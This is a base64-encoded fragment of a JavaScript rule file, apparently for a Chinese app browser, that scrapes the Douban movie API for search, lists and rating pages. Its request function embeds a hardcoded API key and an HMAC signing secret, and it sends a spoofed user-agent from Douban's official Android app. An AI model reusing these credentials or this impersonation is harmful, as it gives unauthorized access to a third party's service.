XRsZTogJ+iLpeS/ruaUueiuvue9ruS4jei1t+S9nOeUqCzngrnmiJHlpI3liLbplJnor6/kv6Hmga/mj5DkuqTnu5nlvIDlj5HogIUnLFxcbiAgZGVzYzogZS50b1N0cmluZygpLFxcbiAgY29sX3R5cGU6ICd0ZXh0XzEnLFxcbiAgdXJsOiAnY29weTovLycgKyBlLnRvU3RyaW5nKCksXFxufSk7XFxuXFxuc2V0UmVzdWx0KGQpO1xcblwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi6aG65L2s5LiT55So6K+m5oOF6aG1XCIsXCJwYXRoXCI6XCJTZGV0YWlsXCIsXCJydWxlXCI6XCJqczpcXG5ldmFsKE1ZX1JVTEUucHJlUnVsZSk7XFxuZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoXFxcImhpa2VyOi8vcGFnZS9tYWluXFxcIikpLnJ1bGUpO1xcbmxldCB0eXBlID0gZ2V0UGFyYW0oJ3R5cGUnLCAnJyksXFxuICAgIGlkID0gZ2V0UGFyYW0oJ2lkJywgJycpO1xcbmRldGFpbHNWaWV3KHR5cGUsIGlkKTtcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuS4u+S7o+eggVwiLFwicGF0aFwiOlwibWFpblwiLFwicnVsZVwiOlwibGV0IHZlcnNpb24gPSAyMDI0MDIxNzAwMDE7XFxyXFxuZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS91dGlscycpKS5ydWxlKTtcXHJcXG5cXHJcXG5sZXQgcGFyc2VWaWRlb1VybExhenkgPSAkLnRvU3RyaW5nKCgpID0+IHtcXHJcXG4gICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICBsZXQgYW5hbHlzaXNDb25maWdzID0gZ2V0Q29uZmlnKCdhbmFseXNpc0NvbmZpZ3MnKTtcXHJcXG4gICAgbGV0IGFuYWx5c2lzQ29uZmlnID0gYW5hbHlzaXNDb25maWdzW2FuYWx5c2lzQ29uZmlncy51c2VdLmNvbmZpZztcXHJcXG4gICAgbGV0IHJlc3VsdCA9IFxcXCJ0b2FzdDovL+ino+aekOWksei0pVxcXCI7XFxyXFxuICAgIHRyeSB7XFxyXFxuICAgICAgICBpZiAoYW5hbHlzaXNDb25maWcuc3RhcnRzV2l0aChcXFwiKFxcXCIpKSB7XFxyXFxuICAgICAgICAgICAgZXZhbCgncmVzdWx0ID0gJyArIGFuYWx5c2lzQ29uZmlnKTtcXHJcXG4gICAgICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICAgICAgZXZhbCgncmVzdWx0ID0gJyArICcoKCkgPT4geycgKyBhbmFseXNpc0NvbmZpZyArICd9KSgpJyk7XFxyXFxuICAgICAgICB9XFxyXFxuICAgIH0gY2F0Y2ggKGUpIHt9XFxyXFxuICAgIHJldHVybiByZXN1bHQ7XFxyXFxufSlcXHJcXG5cXHJcXG4vL+mmlumhtVxcclxcbmZ1bmN0aW9uIGhvbWUoKSB7XFxyXFxuICAgIGlmIChnZXRJdGVtKFxcXCJzdGFydFxcXCIsIFxcXCJcXFwiKSA9PSBcXFwiXFxcIikge1xcclxcbiAgICAgICAgc2V0SXRlbShcXFwic3RhcnRcXFwiLCBcXFwiMVxcXCIpO1xcclxcbiAgICAgICAgc2V0SXRlbSgndXBkYXRlJywgU3RyaW5nKHZlcnNpb24pKTtcXHJcXG4gICAgICAgIGNvbmZpcm0oe1xcclxcbiAgICAgICAgICAgIHRpdGxlOiAn5rip6aao5o+Q56S6JyxcXHJcXG4gICAgICAgICAgICBjb250ZW50OiAn5q2k6KeE5YiZ5LuF6ZmQ5a2m5Lmg5Lqk5rWB5L2/55SoXFxcXG7or7fkuo7lr7zlhaXlkI4yNOWwj+aXtuWGheWIoOmZpCFcXFxcblxcXFxu5Lu75L2V57uE57uH5oiW5Liq5Lq65LiN5b6X5Lul5Lu75L2V5pa55byP5pa55rOVXFxcXG7kvKDmkq3mraTop4TliJnnmoTmlbTkvZPmiJbpg6jliIYhIVxcXFxuXFxcXG7mhJ/osKLlpKfkvazku6zmj5DkvpvnmoTmioDmnK/mlK/mjIEhISEnLFxcclxcbiAgICAgICAgICAgIGNvbmZpcm06ICcnLFxcclxcbiAgICAgICAgICAgIGNhbmNlbDogJydcXHJcXG4gICAgICAgIH0pXFxyXFxuICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICBsZXQgdXBkYXRlSW5mbyA9IGdldEl0ZW0oJ3VwZGF0ZScsICcnKTtcXHJcXG4gICAgICAgIGlmICh1cGRhdGVJbmZvID09ICcnIHx8IHBhcnNlSW50KHVwZGF0ZUluZm8pIDwgdmVyc2lvbikge1xcclxcbiAgICAgICAgICAgIHNldEl0ZW0oJ3VwZGF0ZScsIFN0cmluZyh2ZXJzaW9uKSk7XFxyXFxuICAgICAgICAgICAgY29uZmlybSh7XFxyXFxuICAgICAgICAgICAgICAgIHRpdGxlOiAn5pys5qyh5pu05paw5YaF5a65JyxcXHJcXG4gICAgICAgICAgICAgICAgY29udGVudDogJ+mZjeS9jumFjee9ruaWh+S7tuWHuumUmeamgueOhycsXFxyXFxuICAgICAgICAgICAgICAgIGNvbmZpcm06ICcnLFxcclxcbiAgICAgICAgICAgICAgICBjYW5jZWw6ICcnXFxyXFxuICAgICAgICAgICAgfSlcXHJcXG4gICAgICAgIH1cXHJcXG4gICAgfVxcclxcbiAgICBhZGRMaXN0ZW5lcihcXFwib25DbG9zZVxcXCIsICQudG9TdHJpbmcoKCkgPT4ge1xcclxcbiAgICAgICAgY2xlYXJNeVZhcihcXFwicWRiX2NvbmZpZ1xcXCIpO1xcclxcbiAgICB9KSlcXHJcXG4gICAgbGV0IGhvbWVQYWdlQ29uZmlncyA9IGdldENvbmZpZygnaG9tZVBhZ2VDb25maWdzJyk7XFxyXFxuICAgIGxldCBob21lUGFnZUNvbmZpZyA9IGhvbWVQYWdlQ29uZmlnc1tob21lUGFnZUNvbmZpZ3MudXNlXS5jb25maWc7XFxyXFxuICAgIGlmIChob21lUGFnZUNvbmZpZy5zdGFydHNXaXRoKFxcXCIoXFxcIikpIHtcXHJcXG4gICAgICAgIGV2YWwoJ2QgPSAnICsgaG9tZVBhZ2VDb25maWcpXFxyXFxuICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICBldmFsKCdkID0gJyArICcoKCkgPT4geycgKyBob21lUGFnZUNvbmZpZyArICd9KSgpJylcXHJcXG4gICAgfVxcclxcbiAgICBzZXRSZXN1bHQoZCk7XFxyXFxufVxcclxcblxcclxcbi8v5rW36ZiU5pCc57SiXFxyXFxuZnVuY3Rpb24gc2VhcmNoKCkge1xcclxcbiAgICBsZXQgd2QgPSBNWV9VUkwuc3BsaXQoXFxcIi8jL1xcXCIpWzFdO1xcclxcbiAgICBsZXQgcGFnZSA9IE1ZX1BBR0U7XFxyXFxuICAgIGxldCBzID0gZ2V0RG91YmFuUmVzKCdodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL3NlYXJjaC9zdWJqZWN0cz90eXBlPW1vdmllJnE9JyArIHdkICsgKHBhZ2UgPyAnJnN0YXJ0PScgKyAocGFnZSAtIDEpICogMjAgOiAnJnN0YXJ0PTAnKSArICcmY291bnQ9MjAnKTtcXHJcXG5cXHJcXG4gICAgbGV0IGxpc3QgPSBzLml0ZW1zO1xcclxcbiAgICBsZXQgZGV0YWlsc1ZpZXdDb25maWdzID0gZ2V0Q29uZmlnKCdkZXRhaWxzVmlld0NvbmZpZ3MnKTtcXHJcXG5cXHJcXG4gICAgbGV0IGl0ZW1zID0gW107XFxyXFxuICAgIGxpc3QuZm9yRWFjaChkYXRhID0+IHtcXHJcXG4gICAgICAgIGlmIChkYXRhLnRhcmdldF90eXBlID09ICdkb3VsaXN0X2NhcmRzJykge1xcclxcbiAgICAgICAgICAgIGRhdGEudGFyZ2V0LmRvdWxpc3RzLmZvckVhY2goZSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIGl0ZW1zLnB1c2goe1xcclxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGUudGl0bGUsXFxyXFxuICAgICAgICAgICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHkvJHBhZ2V7ZnlwYWdlfSNub0hpc3RvcnkjJylcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICAucnVsZSgodHlwZSwgaWQpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAodHlwZSA9PT0gXFxcInBsYXlsaXN0XFxcIikge1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG91TGlzdChpZCwgTVlfUEFHRSwgNTApO1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHR5cGUgPT0gXFxcImNvbGxlY3Rpb25cXFwiIHx8IHR5cGUgPT0gXFxcImNoYXJ0XFxcIikge1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3ViamVjdENvbGxlY3Rpb25MaXN0KE1ZX1BBR0UsIDUwLCBpZCk7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICB9LCBlLnRhcmdldF90eXBlLCBlLmlkKSxcXHJcXG4gICAgICAgICAgICAgICAgICAgIGltZzogZS5jb3Zlcl91cmwgKyBcXFwiQFJlZmVyZXI9XFxcIiArIGUuY292ZXJfdXJsXFxyXFxuICAgICAgICAgICAgICAgIH0pXFxyXFxuICAgICAgICAgICAgfSlcXHJcXG4gICAgICAgIH0gZWxzZSBpZiAoZGF0YS50YXJnZXRfdHlwZSA9PSAnY2hhcnQnKSB7XFxyXFxuICAgICAgICAgICAgbGV0IGUgPSBkYXRhLnRhcmdldDtcXHJcXG4gICAgICAgICAgICBpdGVtcy5wdXNoKHtcXHJcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGUudGl0bGUsXFxyXFxuICAgICAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eS8kcGFnZXtmeXBhZ2V9I25vSGlzdG9yeSMnKVxcclxcbiAgICAgICAgICAgICAgICAgICAgLnJ1bGUoKHR5cGUsIGlkKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICh0eXBlID09PSBcXFwicGxheWxpc3RcXFwiKSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvdUxpc3QoaWQsIE1ZX1BBR0UsIDUwKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHR5cGUgPT0gXFxcImNvbGxlY3Rpb25cXFwiIHx8IHR5cGUgPT0gXFxcImNoYXJ0XFxcIikge1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdWJqZWN0Q29sbGVjdGlvbkxpc3QoTVlfUEFHRSwgNTAsIGlkKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgICAgICAgICB9LCBkYXRhLnRhcmdldF90eXBlLCBlLmlkKSxcXHJcXG4gICAgICAgICAgICAgICAgaW1nOiBlLmNvdmVyX3VybCArIFxcXCJAUmVmZXJlcj1cXFwiICsgZS5jb3Zlcl91cmxcXHJcXG4gICAgICAgICAgICB9KVxcclxcbiAgICAgICAgfSBlbHNlIHtcXHJcXG4gICAgICAgICAgICBsZXQgdHlwZSA9IGRhdGEudGFyZ2V0X3R5cGUsXFxyXFxuICAgICAgICAgICAgICAgIGlkID0gZGF0YS50YXJnZXQuaWQsXFxyXFxuICAgICAgICAgICAgICAgIHRpdGxlID0gZGF0YS50YXJnZXQudGl0bGU7XFxyXFxuICAgICAgICAgICAgbGV0IHVzZUNvbmZpZyA9IGRldGFpbHNWaWV3Q29uZmlnc1tkZXRhaWxzVmlld0NvbmZpZ3MudXNlXS5jb25maWc7XFxyXFxuICAgICAgICAgICAgbGV0IHVybFBhcmFtcyA9IHt9O1xcclxcbiAgICAgICAgICAgIGlmICh1c2VDb25maWcuc3RhcnRzV2l0aCgneycpKSB7XFxyXFxuICAgICAgICAgICAgICAgIGV2YWwoJ3VybFBhcmFtcyA9ICcgKyB1c2VDb25maWcpO1xcclxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICAgICAgICAgIHVybFBhcmFtcy51cmwgPSAkKFxcXCJoaWtlcjovL2VtcHR5I25vSGlzdG9yeSMjaW1tZXJzaXZlVGhlbWUjXFxcIiArICc/dHlwZT0nICsgdHlwZSArICcmaWQ9JyArIGlkKVxcclxcbiAgICAgICAgICAgICAgICAgICAgLnJ1bGUoKHR5cGUsIGlkLCB0aXRsZSwgdXNlQ29uZmlnKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICh0eXBlID09PSBcXFwicGxheWxpc3RcXFwiKSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvdUxpc3QoaWQsIE1ZX1BBR0UsIDUwKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmFsKHVzZUNvbmZpZyk7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcclxcbiAgICAgICAgICAgICAgICAgICAgfSwgdHlwZSwgaWQsIHRpdGxlLCB1c2VDb25maWcpO1xcclxcbiAgICAgICAgICAgIH1cXHJcXG4gICAgICAgICAgICBpdGVtcy5wdXNoKHtcXHJcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHRpdGxlLFxcclxcbiAgICAgICAgICAgICAgICBpbWc6IGRhdGEudGFyZ2V0LmNvdmVyX3VybCArIFxcXCJAUmVmZXJlcj1cXFwiICsgZGF0YS50YXJnZXQuY292ZXJfdXJsLFxcclxcbiAgICAgICAgICAgICAgICBkZXNjOiBkYXRhLnR5cGVfbmFtZSxcXHJcXG4gICAgICAgICAgICAgICAgY29udGVudDogZGF0YS50YXJnZXQuY2FyZF9zdWJ0aXRsZSxcXHJcXG4gICAgICAgICAgICAgICAgdXJsOiB1cmxQYXJhbXMudXJsLFxcclxcbiAgICAgICAgICAgICAgICBleHRyYTogdXJsUGFyYW1zLmV4dHJhXFxyXFxuICAgICAgICAgICAgfSk7XFxyXFxuICAgICAgICB9XFxyXFxuXFxyXFxuICAgIH0pO1xcclxcblxcclxcbiAgICBzZXRTZWFyY2hSZXN1bHQoe1xcclxcbiAgICAgICAgZGF0YTogaXRlbXNcXHJcXG4gICAgfSk7XFxyXFxufVxcclxcblxcclxcbi8v5LqM57qn6aG16Z2iXFxyXFxuZnVuY3Rpb24gZXJqaSgpIHtcXHJcXG4gICAgYWRkTGlzdGVuZXIoXFxcIm9uQ2xvc2VcXFwiLCAkLnRvU3RyaW5nKCgpID0+IHtcXHJcXG4gICAgICAgIGNsZWFyTXlWYXIoXFxcImZpbmRMaXN0XFxcIik7XFxyXFxuICAgICAgICBjbGVhck15VmFyKFxcXCJob3RMaXN0XFxcIik7XFxyXFxuICAgICAgICBjbGVhck15VmFyKFxcXCJjbGFzc2xpc3RcXFwiKTtcXHJcXG4gICAgICAgIGNsZWFyTXlWYXIoXFxcInBsYXlsaXN0XFxcIik7XFxyXFxuICAgICAgICBjbGVhck15VmFyKFxcXCJyYW5rTGlzdFxcXCIpO1xcclxcbiAgICAgICAgY2xlYXJNeVZhcihcXFwicmFua2luZ1xcXCIpO1xcclxcbiAgICAgICAgY2xlYXJNeVZhcihcXFwiY29taW5nXFxcIik7XFxyXFxuICAgICAgICBjbGVhck15VmFyKFxcXCJhbmFseXNpc1xcXCIpO1xcclxcbiAgICB9KSlcXHJcXG5cXHJcXG4gICAgbGV0IGNob2ljZSA9IE1ZX1VSTC5zcGxpdCgnLyMvJylbMV0uc3BsaXQoJyMnKVswXTtcXHJcXG4gICAgbGV0IGQgPSBbXTtcXHJcXG4gICAgc3dpdGNoIChjaG9pY2UpIHtcXHJcXG4gICAgICAgIGNhc2UgXFxcIuaOqOiNkFxcXCI6XFxyXFxuICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgIGQgPSBmaW5kTGlzdChNWV9QQUdFLCAxMCk7XFxyXFxuICAgICAgICAgICAgYnJlYWs7XFxyXFxuICAgICAgICBjYXNlIFxcXCLng63pl6hcXFwiOlxcclxcbiAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXHJcXG4gICAgICAgICAgICBkID0gaG90TGlzdChNWV9QQUdFLCAxMCk7XFxyXFxuICAgICAgICAgICAgYnJlYWs7XFxyXFxuICAgICAgICBjYXNlIFxcXCLliIbnsbtcXFwiOlxcclxcbiAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXHJcXG4gICAgICAgICAgICBkID0gY2xhc3NMaXN0KE1ZX1BBR0UsIDE1KTtcXHJcXG4gICAgICAgICAgICBicmVhaztcXHJcXG4gICAgICAgIGNhc2UgXFxcIueJh+WNlVxcXCI6XFxyXFxuICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgIGQgPSBwbGF5TGlzdChNWV9QQUdFLCAxMCk7XFxyXFxuICAgICAgICAgICAgYnJlYWs7XFxyXFxuICAgICAgICBjYXNlIFxcXCLmppzljZVcXFwiOlxcclxcbiAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXHJcXG4gICAgICAgICAgICBkID0gcmFua0xpc3QoTVlfUEFHRSwgMTApO1xcclxcbiAgICAgICAgICAgIGJyZWFrO1xcclxcbiAgICAgICAgY2FzZSBcXFwi5bCG5LiK5pigXFxcIjpcXHJcXG4gICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxyXFxuICAgICAgICAgICAgZCA9IGNvbWluZ0xpc3QoTVlfUEFHRSwgMTApO1xcclxcbiAgICAgICAgICAgIGJyZWFrO1xcclxcbiAgICB9XFxyXFxuICAgIHNldFJlc3VsdChkKTtcXHJcXG59XFxyXFxuXFxyXFxuLy/ojrflj5bosYbnk6PotYTmupAs6L+U5ZueanNvbuaVsOaNrlxcclxcbmZ1bmN0aW9uIGdldERvdWJhblJlcyh1cmwpIHtcXG4gICAgLy9sb2codXJsKVxcclxcbiAgICB2YXIgY2MgPW51bGw7XFxyXFxuICAgIGlmKCQudHlwZSh1cmwpPT0nb2JqZWN0Jyl7XFxyXFxuICAgICAgICAgY2M9dXJsLmNjO1xcclxcbiAgICAgICAgIHVybCA9IHVybC51cmw7XFxyXFxuICAgIH1cXHJcXG4gICAgdmFyIF91cmwgPSB1cmw7XFxyXFxuICAgIGlmICh1cmwuaW5kZXhPZignYXBpa2V5JykgPT09IC0xKSB7XFxyXFxuICAgICAgICBfdXJsICs9ICh1cmwuaW5kZXhPZignPycpID09PSAtMSA/ICc/JyA6ICcmJykgKyBcXFwiYXBpa2V5PTBkYWQ1NTFlYzBmODRlZDAyOTA3ZmY1YzQyZThlYzcwXFxcIlxcclxcbiAgICB9XFxyXFxuICAgIGxldCBfdHMgPSBwYXJzZUludChEYXRlLm5vdygpLzEwMDApLnRvU3RyaW5nKCk7XFxyXFxuICAgIGxldCBtID0gJ0dFVCYnICsgZW5jb2RlVVJJQ29tcG9uZW50KHVybC5zcGxpdCgnZG91YmFuLmNvbScpWzFdLnNwbGl0KCc/JylbMF0pICsgJyYnICsgX3RzO1xcclxcbiAgICBldmFsKGdldENyeXB0b0pTKCkpO1xcclxcbiAgICBsZXQgX3NpZyA9IGhleFRvQmFzZTY0KENyeXB0b0pTLkhtYWNTSEExKG0sJ2JmN2RkZGM3YzljZmU2ZjcnKS50b1N0cmluZygpKTtcXHJcXG4gICAgX3VybCArPSAnJl9zaWc9JyArIF9zaWcgKycmX3RzPScgKyBfdHM7XFxyXFxuICAgIC8vbGV0IGNvb2tpZUNhY2hlID0gJ2hpa2VyOi8vZmlsZXMvY2FjaGUvZG91YmFuY29va2llLnR4dCc7XFxyXFxuICAgIGxldCBzID0gZmV0Y2goX3VybCwge1xcclxcbiAgICAgICAgaGVhZGVyczoge1xcclxcbiAgICAgICAgICAgIC8vJ0Nvb2tpZSc6IGZldGNoKGNvb2tpZUNhY2hlKSxcXHJcXG4gICAgICAgICAgICBcXFwiVXNlci1BZ2VudFxcXCI6IFxcXCJSZXh4YXItQ29yZS8wLjEuMyBhcGktY2xpZW50LzEgY29tLmRvdWJhbi5mcm9kby83LjkuMC5iZXRhMigyMTUpIEFuZHJvaWQvMjUgcHJvZHVjdC9UQVMtQUwwMCB2ZW5kb3IvSFVBV0VJIG1vZGVsL1RBUy1BTDAwICByb20vYW5kcm9pZCAgbmV0d29yay93aWZpICBwbGF0Zm9ybS9tb2JpbGUgY29tLmRvdWJhbi5mcm9kby83LjkuMC5iZXRhMigyMTUpIFJleHhhci8xLjIuMTUxICBwbGF0Zm9ybS9tb2JpbGUgMS4yLjE1MVxcXCJcXHJcXG4gICAgICAgIH0sXFxyXFxuICAgICAgICBtZXRob2Q6ICdHRVQnXFxyXFxuICAgICAgICAvL2JvZHk6ICdob3N0PWZyb2RvLmRvdWJhbi5jb20nXFxyXFxuICAgIH0pO1xcclxcbiAgICBsZXQganNvbiA9IEpTT04ucGFyc2Uocyk7XFxyXFxuICAgIGlmKGpzb24ubG9jYWxpemVkX21lc3NhZ2Upe1xcclxcbiAgICAgICAgY2M9IGNjPT1udWxsID8gMSA6IGNjKzE7XFxyXFxuICAgICAgICBsb2coJ+mHjeivleasoeaVsDonK2NjKTtcXHJcXG4gICAgICAgIGlmKGNjPjUpe3Rocm93IG5ldyBFcnJvcign6LaF5pe2Jyl9XFxyXFxuICAgICAgICBqYXZhLmxhbmcuVGhyZWFkLnNsZWVwKDEwMDApO1xcclxcbiAgICAgICAgcmV0dXJuIGdldERvdWJhblJlcyh7dXJsOnVybCxjYzpjY30pO1xcclxcbiAgICB9ZWxzZXtcXHJcXG4gICAgICAgIHJldHVybiBqc29uO1xcclxcbiAgICB9XFxyXFxufVxcclxcblxcclxcbi8v5qC55o2u6K+E5YiG5L+h5oGv6I635Y+W6K+E5YiG5pif5pif5qC35byPXFxyXFxuZnVuY3Rpb24gY29tcHV0ZVJhdGluZyhlLCB0KSB7XFxyXFxuICAgIGxldCBpID0gXFxcIlxcXCI7XFxyXFxuICAgIGZvciAobGV0IHIgPSAwOyByIDwgNTsgcisrKSByIDwgTWF0aC5yb3VuZCh0IC8gKGUgLyA1KSkgPyBpICs9IFxcXCLimIVcXFwiIDogaSArPSBcXFwi4piGXFxcIjtcXHJcXG4gICAgcmV0dXJuIGk7XFxyXFxufVxcclxcblxcclxcbi8v6K+E5YiG6K+m5oOF6aG16Z2iXFxyXFxuZnVuY3Rpb24gcmF0aW5nKHR5cGUsIGlkLCByYXRpbmdDb3VudCkge1xcclxcbiAgICBzZXRQYWdlVGl0bGUoJ+W9seeJh+S/oeaBrycpO1xcclxcbiAgICAvL+ivhOWIhue7n+iuoVxcclxcbiAgICBsZXQgaSA9IGdldERvdWJhblJlcyhcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9cXFwiICsgdHlwZSArIFxcXCIvXFxcIiArIGlkICsgXFxcIi9yYXRpbmdcXFwiKTtcXHJcXG5cXHJcXG4gICAgbGV0IHIgPSBcXFwiPGgyPuivhOWIhue7n+iuoTwvaDI+XFxcIjtcXHJcXG5cXHJcXG4gICAgciArPSAnPHNtYWxsPjxmb250IGNvbG9yPVxcXCJncmV5XFxcIj4nICsgcmF0aW5nQ291bnQgKyAn5Lq66K+E5YiGJyArICc8L2ZvbnQ+PC9zbWFsbD48YnIvPic7XFxyXFxuXFxyXFxuICAgIGxldCBzdGFyQ29sb3IgPSBnZXRDb25maWcoJ3N0YXJDb2xvcicpO1xcclxcbiAgICBpZiAoaS5zdGF0cy5sZW5ndGggPT0gMCkge1xcclxcbiAgICAgICAgaS5zdGF0cyA9IFswLCAwLCAwLCAwLCAwXTtcXHJcXG4gICAgfVxcclxcbiAgICBpLnN0YXRzLnJldmVyc2UoKS5mb3JFYWNoKCgodmFsdWUsIGluZGV4KSA9PiB7XFxyXFxuICAgICAgICByICs9ICc8Zm9udCBjb2xvcj0nICsgc3RhckNvbG9yICsgJz4nICsgW1xcXCLimIXimIXimIXimIXimIVcXFwiLCBcXFwi4piF4piF4piF4piF4piGXFxcIiwgXFxcIuKYheKYheKYheKYhuKYhlxcXCIsIFxcXCLimIXimIXimIbimIbimIZcXFwiLCBcXFwi4piF4piG4piG4piG4piGXFxcIl1baW5kZXhdICsgXFxcIjwvZm9udD4mbmJzcDtcXFwiO1xcclxcblxcclxcbiAgICAgICAgciArPSBmdW5jdGlvbihlKSB7XFxyXFxuICAgICAgICAgICAgbGV0IHQxID0gJyc7XFxyXFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBlOyBpKyspIHQxICs9IFxcXCLilodcXFwiO1xcclxcbiAgICAgICAgICAgIGxldCB0MiA9ICcnO1xcclxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgMTAgLSBlOyBpKyspIHQyICs9IFxcXCLilodcXFwiO1xcclxcbiAgICAgICAgICAgIHJldHVybiB0MS5mb250Y29sb3IoJyNmZmFjMmQnKSArIHQyLmZvbnRjb2xvcignI2U1ZTFlNCcpO1xcclxcbiAgICAgICAgfSgoMTAgKiB2YWx1ZSkudG9GaXhlZCgwKSk7XFxyXFxuXFxyXFxuICAgICAgICByICs9ICcmbmJzcDs8c21hbGw+PGZvbnQgY29sb3I9XFxcImdyZXlcXFwiPicgKyAoMTAwICogdmFsdWUpXFxyXFxuICAgICAgICAgICAgLnRvRml4ZWQoMSkgKyBcXFwiJTwvZm9udD48L3NtYWxsPjxici8+XFxcIjtcXHJcXG4gICAgfSkpO1xcclxcblxcclxcbiAgICByICs9IFtpLmRvbmVfY291bnQgPyBpLmRvbmVfY291bnQgKyBcXFwi5Lq655yL6L+HXFxcIiA6IFxcXCJcXFwiLCBpLmRvaW5nX2NvdW50ID8gaS5kb2luZ19jb3VudCArIFxcXCLkurrlnKjnnItcXFwiIDogXFxcIlxcXCIsIGkud2lzaF9jb3VudCA/IGkud2lzaF9jb3VudCArIFxcXCLkurrmg7PnnItcXFwiIDogXFxcIlxcXCJdLmpvaW4oXFxcIiZuYnNwOyZuYnNwO1xcXCIpXFxyXFxuICAgICAgICAuc21hbGwoKVxcclxcbiAgICAgICAgLmZvbnRjb2xvcignZ3JleScpO1xcclxcbiAgICAvL+W9seeJh+S/oeaBr1xcclxcbiAgICBpID0gZ2V0RG91YmFuUmVzKFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL1xcXCIgKyB0eXBlICsgXFxcIi9cXFwiICsgaWQgKyBcXFwiL2Rlc2NcXFwiKTtcXHJcXG4gICAgbGV0IGwgPSBpLmh0bWwucmVwbGFjZSgvW1xcXFxuXFxcXHRcXFxccl0vZywgXFxcIlxcXCIpXFxyXFxuICAgICAgICAucmVwbGFjZSgvPHRkXFxcXHMqW14+XSo+KC4qPyk8XFxcXC90ZD4vZywgXFxcIjxzcGFuPiQxPC9zcGFuPlxcXCIpXFxyXFxuICAgICAgICAucmVwbGFjZSgvPHRyXFxcXHMqW14+XSo+KC4qPyk8XFxcXC90cj4vZywgXFxcIjx0ZW5nPiQxPC90ZW5nPjxici8+XFxcIik7XFxyXFxuICAgIHBhcnNlRG9tRm9yQXJyYXkobCwgXFxcInNlY3Rpb24mJnRlbmdcXFwiKS5mb3JFYWNoKChlID0+IHtcXHJcXG4gICAgICAgIGxldCB0ID0gcGFyc2VEb21Gb3JBcnJheShlLCBcXFwic3BhblxcXCIpO1xcclxcbiAgICAgICAgbCA9IGwucmVwbGFjZSh0WzBdLCAnPGZvbnQgY29sb3I9XFxcImdyZXlcXFwiPicgKyB0WzBdLnJlcGxhY2UoLzxzcGFuXFxcXHMqW14+XSo+KC4qPyk8XFxcXC9zcGFuPi9nLCBcXFwiJDFcXFwiKSArIFxcXCLvvJo8L2ZvbnQ+XFxcIilcXHJcXG4gICAgfSkpO1xcclxcbiAgICByICs9IGw7XFxyXFxuICAgIC8v6I635aWW6K6w5b2VXFxyXFxuICAgIGxldCBwYWdlID0gTVlfUEFHRTtcXHJcXG4gICAgbGV0IHMgPSBnZXREb3ViYW5SZXMoXFxcI